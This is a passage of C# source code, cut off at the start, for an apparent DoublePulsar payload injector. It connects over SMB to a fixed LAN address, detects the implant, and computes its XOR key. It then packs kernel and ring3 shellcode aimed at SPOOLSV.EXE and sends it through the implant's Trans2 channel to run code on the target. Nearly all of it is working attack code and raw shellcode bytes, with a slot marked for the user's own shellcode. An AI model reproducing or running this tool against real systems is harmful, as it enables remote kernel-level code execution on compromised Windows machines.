            readedBytes = new byte[message.Length];
            xoredBytes = new byte[message.Length];
            Array.Copy(message, readedBytes, message.Length);

            for (int i = 0; i < readedBytes.Length; i++)
            {
                int xoredInt = readedBytes[i] ^ key;
                xoredBytes[i] = (byte)xoredInt;
            }

            return xoredBytes;
        }

        public static byte[] ByteXor(byte[] data, uint key)
        {
            // Convert the key to a 4-byte array (little-endian)
            byte[] keyBytes = BitConverter.GetBytes(key);
            int keyLength = keyBytes.Length;

            // XOR each byte in the data with the corresponding byte from the key
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ keyBytes[i % keyLength]);
            }

            return result;
        }

        // Rotate Right (ROR) function
        static uint Ror(uint dword, int bits)
        {
            return (dword >> bits) | (dword << (32 - bits));
        }

        // Generate process hash
        static uint GenerateProcessHash(string process)
        {
            uint procHash = 0;

            for (int i = 0; i <= process.Length; i++)
            {
                procHash = Ror(procHash, 13);
                procHash += (i < process.Length) ? (byte)process[i] : (byte)0;
            }

            return procHash;
        }


        static void Main(string[] args)
        {
            string target = "192.168.0.70";
            string ip = target;
            int port = 445;
            TcpClient client = new TcpClient(ip, port);
            Socket sock = client.Client;

            Console.WriteLine("Connecting to host: " + target);
            ClientNegotiate(sock);
            byte[] response = SMB1AnonymousLogin(sock);
            SMB_HEADER header = SMB_HeaderFromBytes(response);
            response = TreeConnectAndXRequest(ip, sock, header.UID);
            header = SMB_HeaderFromBytes(response);
            sock.ReceiveTimeout = 2000;
            Console.WriteLine("Connection established");

            //we need to obtain the key for DoublePulsar so send DoublePulsar trans2 ping packet here
            byte[] pingrequestresponse = DoublepulsarPingRequest(sock, header.UID, header.TID);
            System.Console.WriteLine("Sent Doublepulsar Ping packet!");

            //Receive Trans2 DoublePulsar Response & Parse
            header = SMB_HeaderFromBytes(pingrequestresponse);

            //https://github.com/HynekPetrak/doublepulsar-detection-csharp/blob/master/DoublepulsarDetectionLib/DetectDoublePulsar.cs
            //byte[] final_response = pingrequestresponse;

            // Check for 0x51 response to indicate DOUBLEPULSAR infection
            //if (final_response[34] == 0x51)
            if (header.MID == 0x51)
            {
                /*
                When sending data normally it's at location 18 in the buffer

                In our instance, we are getting data back with the RecvSMBMessage function
                which removes the 1st 4 bytes of the packet which is the NETBios header

                */
                //byte[] signature = Slice(pingrequestresponse, 18, 4);
                byte[] signature = Slice(pingrequestresponse, 14, 4);
                UInt32 signature_long = LE2INT(signature);
                UInt32 key = calculate_doublepulsar_xor_key(signature_long);
                //string arch = calculate_doublepulsar_arch(signature_long);
                ulong archSignature = BitConverter.ToUInt64(pingrequestresponse, 18);
                string arch = calculate_doublepulsar_arch(archSignature);


                Console.WriteLine($"DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: {arch}, XOR Key: 0x{key,4:X}");

                byte[] shellcode = new byte[] {
                    0x31, 0xc9, 0x41, 0xe2, 0x01, 0xc3, 0x56, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x53,
                    0x55, 0x48, 0x89, 0xe5, 0x66, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8d, 0x35, 0xe3,
                    0xff, 0xff, 0xff, 0x65, 0x4c, 0x8b, 0x3c, 0x25, 0x38, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x7f, 0x04,
                    0x49, 0xc1, 0xef, 0x0c, 0x49, 0xc1, 0xe7, 0x0c, 0x49, 0x81, 0xef, 0x00, 0x10, 0x00, 0x00, 0x49,
                    0x8b, 0x37, 0x66, 0x81, 0xfe, 0x4d, 0x5a, 0x75, 0xef, 0x41, 0xbb, 0x5c, 0x72, 0x11, 0x62, 0xe8,
                    0x18, 0x02, 0x00, 0x00, 0x48, 0x89, 0xc6, 0x48, 0x81, 0xc6, 0x08, 0x03, 0x00, 0x00, 0x41, 0xbb,
                    0x7a, 0xba, 0xa3, 0x30, 0xe8, 0x03, 0x02, 0x00, 0x00, 0x48, 0x89, 0xf1, 0x48, 0x39, 0xf0, 0x77,
                    0x11, 0x48, 0x8d, 0x90, 0x00, 0x05, 0x00, 0x00, 0x48, 0x39, 0xf2, 0x72, 0x05, 0x48, 0x29, 0xc6,
                    0xeb, 0x08, 0x48, 0x8b, 0x36, 0x48, 0x39, 0xce, 0x75, 0xe2, 0x49, 0x89, 0xf4, 0x31, 0xdb, 0x89,
                    0xd9, 0x83, 0xc1, 0x04, 0x81, 0xf9, 0x00, 0x00, 0x01, 0x00, 0x0f, 0x8d, 0x66, 0x01, 0x00, 0x00,
                    0x4c, 0x89, 0xf2, 0x89, 0xcb, 0x41, 0xbb, 0x66, 0x55, 0xa2, 0x4b, 0xe8, 0xbc, 0x01, 0x00, 0x00,
                    0x85, 0xc0, 0x75, 0xdb, 0x49, 0x8b, 0x0e, 0x41, 0xbb, 0xa3, 0x6f, 0x72, 0x2d, 0xe8, 0xaa, 0x01,
                    0x00, 0x00, 0x48, 0x89, 0xc6, 0xe8, 0x50, 0x01, 0x00, 0x00, 0x41, 0x81, 0xf9 
                };

                byte[] shellcodePartTwo = new byte[] {
                    0x75, 0xbc, 0x49, 0x8b, 0x1e, 0x4d, 0x8d, 0x6e, 0x10, 0x4c, 0x89, 0xea, 0x48, 0x89, 0xd9,
                    0x41, 0xbb, 0xe5, 0x24, 0x11, 0xdc, 0xe8, 0x81, 0x01, 0x00, 0x00, 0x6a, 0x40, 0x68, 0x00, 0x10,
                    0x00, 0x00, 0x4d, 0x8d, 0x4e, 0x08, 0x49, 0xc7, 0x01, 0x00, 0x10, 0x00, 0x00, 0x4d, 0x31, 0xc0,
                    0x4c, 0x89, 0xf2, 0x31, 0xc9, 0x48, 0x89, 0x0a, 0x48, 0xf7, 0xd1, 0x41, 0xbb, 0x4b, 0xca, 0x0a,
                    0xee, 0x48, 0x83, 0xec, 0x20, 0xe8, 0x52, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xc8, 0x00,
                    0x00, 0x00, 0x49, 0x8b, 0x3e, 0x48, 0x8d, 0x35, 0xe9, 0x00, 0x00, 0x00, 0x31, 0xc9, 0x66, 0x03,
                    0x0d, 0xd7, 0x01, 0x00, 0x00, 0x66, 0x81, 0xc1, 0xf9, 0x00, 0xf3, 0xa4, 0x48, 0x89, 0xde, 0x48,
                    0x81, 0xc6, 0x08, 0x03, 0x00, 0x00, 0x48, 0x89, 0xf1, 0x48, 0x8b, 0x11, 0x4c, 0x29, 0xe2, 0x51,
                    0x52, 0x48, 0x89, 0xd1, 0x48, 0x83, 0xec, 0x20, 0x41, 0xbb, 0x26, 0x40, 0x36, 0x9d, 0xe8, 0x09,
                    0x01, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x20, 0x5a, 0x59, 0x48, 0x85, 0xc0, 0x74, 0x18, 0x48, 0x8b,
                    0x80, 0xc8, 0x02, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x0c, 0x48, 0x83, 0xc2, 0x4c, 0x8b, 0x02,
                    0x0f, 0xba, 0xe0, 0x05, 0x72, 0x05, 0x48, 0x8b, 0x09, 0xeb, 0xbe, 0x48, 0x83, 0xea, 0x4c, 0x49,
                    0x89, 0xd4, 0x31, 0xd2, 0x80, 0xc2, 0x90, 0x31, 0xc9, 0x41, 0xbb, 0x26, 0xac, 0x50, 0x91, 0xe8,
                    0xc8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0x4c, 0x8d, 0x89, 0x80, 0x00, 0x00, 0x00, 0x41, 0xc6,
                    0x01, 0xc3, 0x4c, 0x89, 0xe2, 0x49, 0x89, 0xc4, 0x4d, 0x31, 0xc0, 0x41, 0x50, 0x6a, 0x01, 0x49,
                    0x8b, 0x06, 0x50, 0x41, 0x50, 0x48, 0x83, 0xec, 0x20, 0x41, 0xbb, 0xac, 0xce, 0x55, 0x4b, 0xe8,
                    0x98, 0x00, 0x00, 0x00, 0x31, 0xd2, 0x52, 0x52, 0x41, 0x58, 0x41, 0x59, 0x4c, 0x89, 0xe1, 0x41,
                    0xbb, 0x18, 0x38, 0x09, 0x9e, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xe9, 0x41, 0xbb, 0x22,
                    0xb7, 0xb3, 0x7d, 0xe8, 0x74, 0x00, 0x00, 0x00, 0x48, 0x89, 0xd9, 0x41, 0xbb, 0x0d, 0xe2, 0x4d,
                    0x85, 0xe8, 0x66, 0x00, 0x00, 0x00, 0x48, 0x89, 0xec, 0x5d, 0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41,
                    0x5e, 0x41, 0x5f, 0x5e, 0xc3, 0xe9, 0xb5, 0x00, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x31, 0xc0, 0xac,
                    0x41, 0xc1, 0xc9, 0x0d, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
                    0xec, 0xc3, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
                    0x20, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x45, 0x31, 0xc9,
                    0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
                    0xe2, 0xee, 0x45, 0x39, 0xd9, 0x75, 0xda, 0x4c, 0x8b, 0x7a, 0x20, 0xc3, 0x4c, 0x89, 0xf8, 0x41,
                    0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x89, 0xc2, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b,
                    0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20,
                    0x49, 0x01, 0xd0, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0xe8, 0x78, 0xff,
                    0xff, 0xff, 0x45, 0x39, 0xd9, 0x75, 0xec, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66,
                    0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48,
                    0x01, 0xd0, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5b, 0x41, 0x53, 0xff, 0xe0, 0x56,
                    0x41, 0x57, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20, 0x41, 0xbb, 0xda, 0x16, 0xaf, 0x92,
                    0xe8, 0x4d, 0xff, 0xff, 0xff, 0x31, 0xc9, 0x51, 0x51, 0x51, 0x51, 0x41, 0x59, 0x4c, 0x8d, 0x05,
                    0x1a, 0x00, 0x00, 0x00, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0xbb, 0x46, 0x45, 0x1b, 0x22, 0xe8,
                    0x68, 0xff, 0xff, 0xff, 0x48, 0x89, 0xec, 0x5d, 0x41, 0x5f, 0x5e, 0xc3 
                };

                byte[] ring3 = new byte[] {
                    0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xdd, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xef,
                    0xff, 0xff, 0xff, 0x48, 0xbb, 0x1d, 0xab, 0xfd, 0x0e, 0xd7, 0x3a, 0xd2, 0x27, 0x48,
                    0x31, 0x58, 0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0xe1, 0xe3, 0x7e,
                    0xea, 0x27, 0xd2, 0x12, 0x27, 0x1d, 0xab, 0xbc, 0x5f, 0x96, 0x6a, 0x80, 0x76, 0x4b,
                    0xe3, 0xcc, 0xdc, 0xb2, 0x72, 0x59, 0x75, 0x7d, 0xe3, 0x76, 0x5c, 0xcf, 0x72, 0x59,
                    0x75, 0x3d, 0xe3, 0x76, 0x7c, 0x87, 0x72, 0xdd, 0x90, 0x57, 0xe1, 0xb0, 0x3f, 0x1e,
                    0x72, 0xe3, 0xe7, 0xb1, 0x97, 0x9c, 0x72, 0xd5, 0x16, 0xf2, 0x66, 0xdc, 0x62, 0xf0,
                    0x4f, 0xd6, 0xfb, 0x30, 0xca, 0x4f, 0xea, 0xac, 0x46, 0x5c, 0x68, 0xf2, 0xac, 0x5f,
                    0x97, 0xb5, 0x0f, 0x07, 0xb1, 0x52, 0xaf, 0x1d, 0xab, 0xfd, 0x46, 0x52, 0xfa, 0xa6,
                    0x40, 0x55, 0xaa, 0x2d, 0x5e, 0x5c, 0x72, 0xca, 0x63, 0x96, 0xeb, 0xdd, 0x47, 0xd6,
                    0xea, 0x31, 0x71, 0x55, 0x54, 0x34, 0x4f, 0x5c, 0x0e, 0x5a, 0x6f, 0x1c, 0x7d, 0xb0,
                    0x3f, 0x1e, 0x72, 0xe3, 0xe7, 0xb1, 0xea, 0x3c, 0xc7, 0xda, 0x7b, 0xd3, 0xe6, 0x25,
                    0x4b, 0x88, 0xff, 0x9b, 0x39, 0x9e, 0x03, 0x15, 0xee, 0xc4, 0xdf, 0xa2, 0xe2, 0x8a,
                    0x63, 0x96, 0xeb, 0xd9, 0x47, 0xd6, 0xea, 0xb4, 0x66, 0x96, 0xa7, 0xb5, 0x4a, 0x5c,
                    0x7a, 0xce, 0x6e, 0x1c, 0x7b, 0xbc, 0x85, 0xd3, 0xb2, 0x9a, 0x26, 0xcd, 0xea, 0xa5,
                    0x4f, 0x8f, 0x64, 0x8b, 0x7d, 0x5c, 0xf3, 0xbc, 0x57, 0x96, 0x60, 0x9a, 0xa4, 0xf1,
                    0x8b, 0xbc, 0x5c, 0x28, 0xda, 0x8a, 0x66, 0x44, 0xf1, 0xb5, 0x85, 0xc5, 0xd3, 0x85,
                    0xd8, 0xe2, 0x54, 0xa0, 0x46, 0x6d, 0x3b, 0xd2, 0x27, 0x1d, 0xab, 0xfd, 0x0e, 0xd7,
                    0x72, 0x5f, 0xaa, 0x1c, 0xaa, 0xfd, 0x0e, 0x96, 0x80, 0xe3, 0xac, 0x72, 0x2c, 0x02,
                    0xdb, 0x6c, 0xca, 0x67, 0x85, 0x4b, 0xea, 0x47, 0xa8, 0x42, 0x87, 0x4f, 0xd8, 0xc8,
                    0xe3, 0x7e, 0xca, 0xff, 0x06, 0xd4, 0x5b, 0x17, 0x2b, 0x06, 0xee, 0xa2, 0x3f, 0x69,
                    0x60, 0x0e, 0xd9, 0x92, 0x64, 0xd7, 0x63, 0x93, 0xae, 0xc7, 0x54, 0x28, 0x6d, 0xb6,
                    0x56, 0xb1, 0x09, 0x78, 0xd3, 0x98, 0x0e, 0xd7, 0x3a, 0xd2, 0x27
                };

                int shellcodeOnePartLen = shellcode.Length;
                int shellcodePartTwoLen = shellcodePartTwo.Length;
                int ring3Len = ring3.Length;

                string procName = "SPOOLSV.EXE";
                uint hash = GenerateProcessHash(procName);
                Console.WriteLine($"Process Hash for {procName}: 0x{hash:X8}");


                int kernelShellcodeSize = shellcodeOnePartLen + shellcodePartTwoLen + 4;
                Console.WriteLine($"Total size of kernel shellcode: {kernelShellcodeSize}");

                byte[] hMem = new byte[4096];
                Array.Fill(hMem, (byte)0x90);  // Pad with 0x90 (NOP)

                Array.Copy(shellcode, 0, hMem, 0, shellcodeOnePartLen);
                BitConverter.GetBytes(hash).CopyTo(hMem, shellcodeOnePartLen);
                Array.Copy(shellcodePartTwo, 0, hMem, shellcodeOnePartLen + 4, shellcodePartTwoLen);

                BitConverter.GetBytes((ushort)ring3Len).CopyTo(hMem, kernelShellcodeSize);
                Array.Copy(ring3, 0, hMem, kernelShellcodeSize + sizeof(ushort), ring3Len);

                Console.WriteLine("Shellcode prepared successfully.");

                byte[] XorPayload = ByteXor(hMem, key);


                System.Console.WriteLine("Preparing Doublepulsar payload package!");
                //insert your shellcode here
                byte[] buf = new byte[279] {
                  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                  0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                  0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                  0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                  0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                  0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                  0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                  0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                  0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                  0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                  0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                  0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                  0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                  0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                  0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                  0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                  0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                  0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,
                  0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00 };
                byte[] run_shellcode = MakeKernelUserPayload(buf);
                System.Console.WriteLine("Generating shellcode buffer!");

                byte[] ByteXORKEY = INT2LE(key);

                int shellcode_len = shellcode.Length;
                int MAX_SHELLCODE_LEN = 4096;
                int difference = MAX_SHELLCODE_LEN - shellcode_len;


                byte[] SC = new byte[MAX_SHELLCODE_LEN];
                Array.Clear(SC, 0, MAX_SHELLCODE_LEN);
                Array.Copy(shellcode, SC, shellcode.Length);




                System.Console.WriteLine("Shellcode buffer...\n");
                System.Console.WriteLine(HexDump(SC));

                System.Console.WriteLine($"[+] [{ip}] DOUBLEPULSAR - Encrypting shellcode buffer with XOR key");
                System.Console.WriteLine("Encrypting shellcode buffer...\n");
                for (Int32 i = 0; i < SC.Length; i++)
                {
                    SC[i] ^= (byte)ByteXORKEY[i % 4];
                }

                //System.Console.WriteLine(HexDump(SC));

                System.Console.WriteLine("Generating the Doublepulsar parameters...\n");
                List<byte> Parameters = new List<byte>();
                Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));

                //convert params to byte
                //byte[] paramBytes = GetBytes(Parameters);
                byte[] paramz = Parameters.ToArray();
                UInt32 MAX_SIZE_FOR_PAYLOAD = 4096;
                UInt32 TotalByteCount = MAX_SIZE_FOR_PAYLOAD;
                UInt32 ChunkSize = MAX_SIZE_FOR_PAYLOAD;
                UInt32 Offset = 0;

                byte[] ByteTotalByteCount = INT2LE(TotalByteCount);
                byte[] ByteChunkSize = INT2LE(ChunkSize);
                byte[] ByteOffset = INT2LE(Offset);

                System.Buffer.BlockCopy(ByteTotalByteCount, 0, paramz, 0, 4);
                System.Buffer.BlockCopy(ByteChunkSize, 0, paramz, 4, 4);
                System.Buffer.BlockCopy(ByteOffset, 0, paramz, 8, 4);

                System.Console.WriteLine("Parameters before encryption...\n");
                System.Console.WriteLine(HexDump(paramz));

                System.Console.WriteLine("Encrypting parameters...\n");
                /*
                for (Int32 i = 0; i < paramz.Length; i++)
                {
                    paramz[i] ^= (byte)ByteXORKEY[i % 4];
                }*/
                byte[] XorParameters = ByteXor(paramz, key);

                System.Console.WriteLine("Parameters after XOR Encryption...\n");
                System.Console.WriteLine(HexDump(XorParameters));
                System.Console.WriteLine($"[+] [{ip}] {HexDump(XorParameters)}");

                SMB_COM_TRANSACTION2_SECONDARY_REQUEST transaction2SecondaryRequest = new SMB_COM_TRANSACTION2_SECONDARY_REQUEST
                {
                    WordCount = 15,
                    TotalParameterCount = 12,
                    TotalDataCount = 0x1000,
                    MaxParameterCount = 1,
                    MaxDataCount = 0x0000,
                    MaxSetupCount = 0x00,
                    Reserved = 0x00,
                    Flags = 0x00,
                    Timeout = 0x001a8925, // [25,89,1a0,00] in packet.  0x001a8925
                    Reserved2 = 0x00,
                    ParameterCount = 12,

                    //where in the packet is the location of the parameters
                    //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> < PARAMETERS ARE HERE >
                    ParameterOffset = 0x0042, //0x0035 OR ParameterDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> (parameters=12)
                    DataCount = 0, //will be updated with the values below

                    //where in the packet is the location of the SMBDATA
                    //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) + (PARAMETERS) -> < SMBDATA IS HERE>
                    DataOffset = 0x004e, // DataDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) (parameters=12) -> ( SMBData=4096 MAX)
                    setupcount = 1, //0x01;
                    reserved3 = 0x00,
                    subcommand = 0x000E,
                    ByteCount = 0,
                    padding = 0x00
                };

                SMB_HEADER Exec_header = new SMB_HEADER
                {
                    protocol = 0x424d53ff,
                    command = 0x32,
                    errorClass = 0x00,
                    _reserved = 0x00,
                    errorCode = 0x0000,
                    flags = 0x18,
                    flags2 = 0xc007,
                    PIDHigh = 0x0000,
                    SecurityFeatures = 0x0000000000000000,
                    reserved = 0x0000,
                    TID = 0xfeff,     //need this value from previous exchanges
                    PIDLow = 0xfeff,  //PIDLow = 0x4b2f,
                    UID = 0x0008,     //need this value from previous exchanges
                    MID = 0x0042
                };

                Exec_header.TID = header.TID;
                Exec_header.UID = header.UID;

                //Merge SMBHeader with the transaction2SecondaryRequest
                byte[] headerBytes = GetBytes(Exec_header);

                transaction2SecondaryRequest.TotalDataCount = (ushort)MAX_SHELLCODE_LEN; // Marshal.SizeOf(encrypted_payload);
                transaction2SecondaryRequest.DataCount = (ushort)MAX_SHELLCODE_LEN; // Marshal.SizeOf(encrypted_payload);

                ushort byteCountOfEncryptedPayload = (ushort)(MAX_SHELLCODE_LEN + 12); // Marshal.SizeOf(encrypted_payload) + 13;
                transaction2SecondaryRequest.ByteCount = (ushort)byteCountOfEncryptedPayload;

                byte[] transaction2SecondaryRequestbytes = GetBytes(transaction2SecondaryRequest).ToArray();
                byte[] pkt = headerBytes.Concat(transaction2SecondaryRequestbytes).ToArray();

                System.Console.WriteLine(HexDump(pkt));

                System.Console.WriteLine("Adding Doublepulsar parameters to the end");
                //append the parameteters to the end of pkt
                pkt = pkt.Concat(XorParameters.ToArray()).ToArray(); //Collect the parameters

                System.Console.WriteLine(HexDump(pkt));

                System.Console.WriteLine("Adding encrypted SMB Data to the end");
                //append SMBData to the end of pkt
                pkt = pkt.Concat(XorPayload.ToArray()).ToArray(); //Collect it all

                System.Console.WriteLine(HexDump(pkt));

                System.Console.WriteLine("SMB packet does not have a size header.  Adding the header!");
                uint size = (uint)pkt.Length;
                byte[] intBytes = BitConverter.GetBytes(size).Reverse().ToArray();
                NETBIOS_HEADER netbios_header = new NETBIOS_HEADER();
                netbios_header.MessageTypeAndSize = BitConverter.ToUInt32(intBytes, 0);
                byte[] netbios_header_packet = GetBytes(netbios_header);
                byte[] fullMessage = netbios_header_packet.Concat(pkt).ToArray();
                System.Console.WriteLine(HexDump(fullMessage));

                //patch user ID and tree ID here with UserID & TreeID bytes
                //fullMessage[28] = tree_id[0];
                //fullMessage[29] = tree_id[1];
                //fullMessage[32] = user_id[0];
                //fullMessage[33] = user_id[1];

                byte[] recv_buffer = new byte[1024];
                try
                {
                    sock.Send(fullMessage);
                    System.Console.WriteLine("Sent a packet!");
                }
                catch (Exception e)
                {
                    Console.WriteLine("Send Error, during sending: " + e.Message);
                }

                try
                {
                    sock.Receive(recv_buffer);
                    // Check for 0x52 response to indicate DOUBLEPULSAR worked
                    // 0x52 = success
                    // 0x62 = parameter failure
                    // 0x72 = alloc error

                    //This will NOT work because we didn't use the SendSMBMessage function
                    /* 
                    header = SMB_HeaderFromBytes(recv_buffer);
                    if (header.MID == 0x52)
                    {
                        System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned {recv_buffer[34]}.  SUCCESS!");
                    }*/

                    /* 
                     * In this code, we are not using the SendSMBMessage function
                     * Because we are not using the SendSMBMessage function
                     * SMB_HeaderFromBytes() becomes equally useless
                     * 
                     * We are just reading the Doublepulsar Multiplex ID at buffer[34]
                     * since we did not use the SendSMBMessage -> ReceiveSMBMessage becomes useless
                     */

                    //DoublePulsar response: STATUS_NOT_IMPLEMENTED
        			if (recv_buffer[9] == 0x02 && recv_buffer[10] == 0x00 && recv_buffer[11] == 0x00 && recv_buffer[12] == 0xc0)
        			{
        			    System.Console.WriteLine("[{ip}] DoublePulsar returned: 0xC0000002 - STATUS_NOT_IMPLEMENTED!\n");
        			}
                    
                    if (recv_buffer[34] == 0x52)
                    {
                        System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned {recv_buffer[34]}.  SUCCESS!");
                    }
                    else if (recv_buffer[34] == 0x62)
                    {
                        System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned: Invalid parameters!");
                    }
                    else if (recv_buffer[34] == 0x72)
                    {
                        System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned: Allocation Error!");
                    }
                    else
                    {
                        System.Console.WriteLine($"[{ip}] DOUBLEPULSAR - Returned: Error!");
                    }
                }

                catch (Exception e)
                {
                    Console.WriteLine("Recv Error: " + e.Message);
                }


                //XorEncrypt the payload
                //XorEncrypt(shellcode, (UInt32)key);
                //byte[] payload_shellcode = XorDecryptFunc(shellcode, (int)key);

                //Build DoublePulsar payload packet
                // byte[] doublepulsar_parameters = new byte[12];
                //int size = Marshal.SizeOf(shellcode);
                //int chunk_size = Marshal.SizeOf(shellcode);
                //int offset = 0x00000000; 
                //copy them to doublepulsar_parameters
                /*
                https://docs.microsoft.com/en-us/dotnet/api/system.buffer.memorycopy?view=net-5.0
                https://stackoverflow.com/questions/2996487/memcpy-function-in-c-sharp
                https://bytes.com/topic/c-sharp/answers/431682-how-do-memcpy-byte
                https://www.abstractpath.com/2009/memcpy-in-c/

                System.Array.Copy(byteA, 0, byteB, 0, 4);

               Array.Copy()

               Buffer.BlockCopy()

               MemoryCopy(size_of_payload, doublepulsar_parameters, 4, 4);
               MemoryCopy(chunk_size, doublepulsar_parameters + 4, 4, 4);
               MemoryCopy(offset, doublepulsar_parameters + 8, 4, 4);
               MemoryCopy (void* source, void* destination, ulong destinationSizeInBytes, ulong sourceBytesToCopy);



                Marshal.Copy(arr, 0, ptr, size);

                Marshal.Copy(arr, 0, ptr, size);

                Marshal.Copy(arr, 0, ptr, size);
                */

                //XorEncrypt the parameters
                //XorEncrypt(doublepulsar_parameters, (UInt32)key);

                /*
                List<byte> doublepulsar_parameters = new List<byte>();
                doublepulsar_parameters.Add((byte)size);
                doublepulsar_parameters.Add((byte)chunk_size);
                doublepulsar_parameters.Add((byte)offset);

                byte[] byte_doublepulsar_parameters = doublepulsar_parameters.ToArray().ToArray();
                byte[] xor_doublepulsar_parameters = XorDecryptFunc(byte_doublepulsar_parameters, (int)key);

                byte[] doublepulsar_exploit_pkt = MakeTrans2Packet(sock, header.TID, header.UID, xor_doublepulsar_parameters, payload_shellcode);
                header = new SMB_HEADER();
                header = SMB_HeaderFromBytes(doublepulsar_exploit_pkt);
                if (header.MID == 82) 
                {
                    Console.WriteLine("It appears that DoublePulsar processed the command successfully!\n");
                }
                else
                {
                    Console.WriteLine("an error occured and it does not appear that DoublePulsar ran successfully\n");
                } */

                /*
              try
              {
                  SendSMBMessage(sock, doublepulsar_exploit_pkt, false);
                  response = ReceiveSMBMessage(sock);
                  header = new SMB_HEADER();
                  header = SMB_HeaderFromBytes(response);
              }
              catch (Exception e)
              {
                  Console.WriteLine("Socket error, this might end badly" + e.Message);
              }*/
            }

            client.Close();
            sock.Close();

        }
    }
}
